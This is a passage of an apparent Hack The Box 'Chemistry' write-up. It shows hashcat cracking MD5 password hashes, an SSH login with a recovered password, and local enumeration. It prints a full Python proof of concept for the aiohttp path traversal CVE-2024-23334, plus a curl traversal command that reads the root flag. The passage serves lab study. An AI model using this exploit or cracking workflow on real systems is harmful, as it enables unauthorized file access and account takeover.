* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

9ad48828b0955513f7cf0f7f6510c8f8:carlos123                
57f7e96f370e04546066ee921424c760:juice                    
6845c17d298d95aa942127bdad2ceb9b:peterparker              
c3601ad2286a4293868ec2a4bc606ba3:victoria123              
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hash
Time.Started.....: Mon Dec 23 13:35:35 2024 (2 secs)
Time.Estimated...: Mon Dec 23 13:35:37 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  6100.4 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 5/15 (33.33%) Digests (total), 5/15 (33.33%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]

Started: Mon Dec 23 13:35:29 2024
Stopped: Mon Dec 23 13:35:39 2024
```
> **Research something called the *potfile***

The reason being is that it caches already cracked hashes into its own rainbow table of sorts(?)
```Bash
┌─[us-vip-3]─[10.10.14.19]─[gntsqid@htb-cyfdkzz7f3]─[~/Documents]
└──╼ [★]$ hashcat --show -m 0 hash 
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
9ad48828b0955513f7cf0f7f6510c8f8:carlos123
6845c17d298d95aa942127bdad2ceb9b:peterparker
c3601ad2286a4293868ec2a4bc606ba3:victoria123
57f7e96f370e04546066ee921424c760:juice
```
---
### SSH - Flag 1
We want to know *rosa's* password:
```Bash
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
```
```Bash
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
```
Now we have our way in:
```Bash
┌─[us-vip-3]─[10.10.14.19]─[gntsqid@htb-cyfdkzz7f3]─[~/Documents]
└──╼ [★]$ ssh rosa@chem.box
The authenticity of host 'chem.box (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'chem.box' (ED25519) to the list of known hosts.
rosa@chem.box's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 23 Dec 2024 07:47:19 PM UTC

  System load:  0.0               Processes:             230
  Usage of /:   72.6% of 5.08GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.38
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
```
```Bash
rosa@chemistry:~$ ll
total 36
drwxr-xr-x 5 rosa rosa 4096 Jun 17  2024 ./
drwxr-xr-x 4 root root 4096 Jun 16  2024 ../
lrwxrwxrwx 1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa 3771 Feb 25  2020 .bashrc
drwx------ 2 rosa rosa 4096 Jun 15  2024 .cache/
drwxrwxr-x 4 rosa rosa 4096 Jun 16  2024 .local/
-rw-r--r-- 1 rosa rosa  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4096 Jun 15  2024 .ssh/
-rw-r--r-- 1 rosa rosa    0 Jun 15  2024 .sudo_as_admin_successful
-rw-r----- 1 root rosa   33 Dec 23 19:13 user.txt
```
and we got flag 1/2!
```Bash
rosa@chemistry:~$ cat user.txt 
b808a30de570a824583f89b8f57152ec
```

### Rosa
Now that we are Rosa, what are the next steps?\
Can she run as sudo?
```Bash
rosa@chemistry:~$ sudo -l -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on chemistry.
```
Nope.

*As per Juan's suggestions*, we want to check what sort of services/ports might be running/listening:
```Bash
rosa@chemistry:~$ netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1001       37245      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          38688      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        36751      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          37207      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      0          37217      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        36750      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          33651      -
```
Here we can see that 8080 is also open.\
Because of this, *Juan suggests* we take a look at this [CVE](https://github.com/wizarddos/CVE-2024-23334).
```Python
import argparse
import http.client
import textwrap
import urllib


def exploit(url, file, dir):
    parsed_url = urllib.parse.urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)

    traversal  = "/.."
    payload = dir
    for i in range(15):
        payload += traversal

        print(f'''[+] Attempt {i}
                    Payload: {payload}{file}
        ''')

        conn.request("GET", f"{parsed_url.path}{payload}{file}")
        res = conn.getresponse()
        result = res.read()
        print(f"                    Status code: {res.status}")

        if res.status == 200:
            print("Respose: ")
            print(result.decode())
            break


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PoC for CVE-2024-23334. LFI/Path-Traversal Vulnerability in Aiohttp",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(''' Usage:
            exploit.py -u http://127.0.0.1 -f /etc/passwd -d /static
        ''')
    )

    parser.add_argument('-u', '--url', help="Aiohttp site url")
    parser.add_argument('-f', '--file', help="File to read")
    parser.add_argument('-d', '--directory', help="Directory with static files. Default: /static", default="/static")

    args = parser.parse_args()
    if args.url and args.file and args.directory:
        exploit(args.url, args.file, args.directory)
        print("Exploit complete")
    else:
        print("Error: One of the parameters is missing")
```
That sort of failed as I couldn't figure out how it worked nor why Juan suggested.\
Maybe due to it being path traversal.\
As such we are able to exploit the following:
```bash
rosa@chemistry:~$ curl -s --path-as-is http://localhost:8080/assets/../../../../../root/root.txt
ebdb60ec70d9db8aaa31a17145f341ec
```


